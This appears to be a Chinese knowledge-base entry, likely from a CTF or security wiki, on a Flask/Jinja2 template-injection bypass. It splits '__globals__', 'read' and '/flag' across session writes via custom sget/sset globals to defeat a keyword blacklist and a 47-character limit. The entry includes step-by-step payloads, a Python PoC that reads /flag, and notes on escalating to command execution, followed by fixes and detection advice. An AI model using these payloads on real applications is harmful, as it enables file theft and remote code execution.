---
id: web-python-ssti-jinja-custom-globals-session-payload-assembly
title: Flask SSTI 黑名单/47 字符绕过：app.jinja_env.globals 的 sget/sset 分段拼出 __globals__ 与 read
type: scenario
domain: web
path: web/python/ssti
technique: jinja-custom-globals-session-payload-assembly
tags:
- python
- flask
- jinja2
- ssti
- waf-bypass
- blacklist
- length-limit
- session
- request-args
- rce
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V203
  verified_at: '2026-11-07T02:17:05+08:00'
  notes: '已对照原文核对：render_template_string(''Welcome: ''+username)、黑名单 config/_/read/{{、47 字符上限、jinja_env.globals 注册 sget/sset、payload {%print sget[sget(''g'')][sget(''r'')](sget(''f''))%} 恰好 47 字符，与原文源码/截图一致。未验证点：未本机复跑 Flask；原文无受影响版本；frontmatter 无 sources/source_url。'
url: /docs/web/python/ssti/web-python-ssti-jinja-custom-globals-session-payload-assembly/
draft: false
kb_aliases:
- Jinja2 47 字符限制绕过
- sget sset SSTI
- app.jinja_env.globals 注入
- 分段拼 payload
- session 存字符串绕过黑名单
- request.args 绕过关键字
- '{%print %} 替代 {{'
---

## 一句话结论

当 Flask 把 `sget`/`sset` 注册为 Jinja 全局函数、且登录接口用 `render_template_string("Welcome: "+username)` 渲染用户输入时，黑名单 `["config","_","read","{{"]` 与 47 字符上限都能被绕过：用 `request.args.a` 把 `__globals__`、`read`、`/flag` 分批存进 session，再用 `{%print sget[sget('g')][sget('r')](sget('f'))%}`（恰好 47 字符，不含任何黑名单词）调用模块级 `read` 读取文件。

## 原理

- **注入点**：`render_template_string("Welcome: " + username)` 把用户名拼进模板源码，Jinja 会解析其中的 `{% ... %}`/`{{ ... }}` 并求值。
- **黑名单**：`username.lower()` 中出现 `config`、`_`、`read`、`{{` 任一子串即 403；同时 `len(username) > 47` 返回 400。直接写 `{{ config.__class__... }}` 或 `{{ ''.__class__ }}` 都会被拦。
- **全局函数**：应用执行 `app.jinja_env.globals.update(sget=sget)`、`sset=sset`，把两个 Python 函数暴露为模板全局变量。`sset(key,value)` 写 Flask session，`sget(key)` 读 session；session 通过签名 Cookie 跨请求保持，因此可以在多次请求中逐步“拼装”字符串。
- **下标回退到 getattr**：在 Jinja 中 `obj[key]` 先做 `getitem`，对象不支持时回退 `getattr`。对 Python 函数对象 `sget`，`sget['__globals__']` 等价于 `sget.__globals__`，即定义 `sget` 的模块全局字典；而应用源码里恰好有 `def read(f): return open(f).read()`，于是 `sget.__globals__['read']` 就是该函数。
- **绕过关键字**：`sget`/`sset` 本身不含下划线；需要出现的 `__globals__`、`read`、`/flag` 放在 `request.args.a` 中，只在前一请求的模板里作为 `sset` 的第二个参数被写入 session，不进入 `username`，因此不触发黑名单与长度检查。最终请求的 `username` 只有 47 字符且不含 `_`/`read`/`{{`。
- **`{%print %}` 代替 `{{ }}`**：`{{` 被黑名单拦截，但 Jinja 语句块 `{%print expr%}` 同样会输出表达式结果，且标签内不需要双花括号。
- **为什么成立**：安全控制作用在“单次请求的 username 字符串”上，而模板求值发生在服务器端且可访问 session；把受控字符串拆分到不同请求/不同参数，就能让最终模板中出现任意 Python 对象路径。

## 触发条件

- 应用把用户输入拼接进 `render_template_string`/`Template`（SSTI）。
- 黑名单只匹配连续子串，且只检查 `username`（或只检查一个参数），没有对 `request.args` 全部参数、session 内容做同等过滤。
- Jinja 环境注入了带 `__globals__` 的应用函数（任何模块级函数都可以），且模块全局中有可用的文件读取/命令执行函数。
- 存在跨请求 session（Flask 默认签名 Cookie 即可），允许分步写入任意字符串。
- 长度限制作用在单次 payload 上，可通过分段规避。

## 利用步骤

1. 用 `{%print 7*7%}`（或 `{%print 'x'%}`）确认模板求值与 `{%print %}` 语法可用，观察黑名单/长度错误信息。
2. 审计应用源码，找出注册到 `jinja_env.globals` 的函数（`sget`/`sset`）及其模块全局中的可用函数（如 `read`、`open`、`os`）。
3. 第一请求：`?username={%print sset('g',request.args.a)%}&a=__globals__`，把 `__globals__` 存入 session 键 `g`。
4. 第二请求：`&a=read` 存入键 `r`；第三请求：`&a=/flag` 存入键 `f`。
5. 第四请求：`?username={%print sget[sget('g')][sget('r')](sget('f'))%}`，模板求值为 `sget.__globals__['read']('/flag')`，回显文件内容。
6. 若需命令执行，把 `read` 换成模块全局里的 `os`/`subprocess` 相关对象，或通过 `__builtins__` 取 `__import__`；同样用 session 分段存字符串。
7. 若目标 session 密钥已知/弱，可直接伪造包含所需字符串的 session，减少请求数。

## PoC

```python
import requests

URL = "http://target/login"
SECRET = "<从 SSRF 或其他接口获取的 secret>"
s = requests.Session()

def step(username, a=None):
    params = {"username": username, "secret": SECRET}
    if a is not None:
        params["a"] = a
    r = s.get(URL, params=params)
    return r.text

print(step("{%print sset('g',request.args.a)%}", "__globals__"))
print(step("{%print sset('r',request.args.a)%}", "read"))
print(step("{%print sset('f',request.args.a)%}", "/flag"))
print(step("{%print sget[sget('g')][sget('r')](sget('f'))%}"))
```

```text
payload 长度核对：{%print sget[sget('g')][sget('r')](sget('f'))%} = 47 字符；
不含 `config`、`_`、`read`、`{{`，因此同时通过黑名单与长度检查。
```

## 变体与关联

- 变体：全局函数换成 `url_for`、`get_flashed_messages`、`lipsum`、`cycler` 等 Flask/Jinja 默认全局；`url_for.__globals__` 同样能拿到模块全局。
- 变体：黑名单包含 `_` 时，可用 `request.args`、`request.values`、`request.cookies` 等把下划线字符串带入；也可用 `attr` 过滤器、`|string`、十六进制/Unicode 转义拼接。
- 变体：长度限制更严时，把对象路径拆成多次 `sset`，最终用 `sget('a')~sget('b')` 拼接或逐层下标取值。
- 变体：无 session 时可用 HTTP 参数、Cookie、Header 或应用缓存作为跨请求存储；也可用 `request.args` 在一次请求中同时传多个参数，只要黑名单只检查 `username`。
- 关联：[[web-python-ssti-jinja2-flask-globals-rce]]（`url_for.__globals__` 经典链）、[[web-python-ssti-length-gated-waf-filler-blacklist-split]]（长度分流 + 字符串拆分）、[[web-python-ssti-jinja2-context-doc-get-chr-keyword-bypass]]（关键字构造）、[[web-python-ssti-jinja2-attr-filter-format-sandbox-escape]]（attr 过滤器沙箱逃逸）。

## 检测与防御

- 修复：不要把用户输入拼接进模板源码；使用 `render_template("welcome.html", username=username)` 并以数据方式转义。
- 修复：若必须渲染用户模板，启用沙箱 `SandboxedEnvironment`，禁止 `__globals__`/`__class__`/`__subclasses__`/`__builtins__` 等属性访问。
- 加固：黑名单改为语义/AST 校验，覆盖所有请求参数与 session；长度限制结合整体请求体检查，而不是只看单个字符串。
- 加固：不要在 `jinja_env.globals` 暴露带敏感模块全局的函数；文件读取/命令执行函数不应位于模板可触达的模块作用域。
- 检测：模板渲染请求中出现 `{%print`、`request.args`、`sset`/`sget`、异常大量 400/403 与短 payload；session 中出现 `__globals__`、`read`、路径字符串等可疑值。
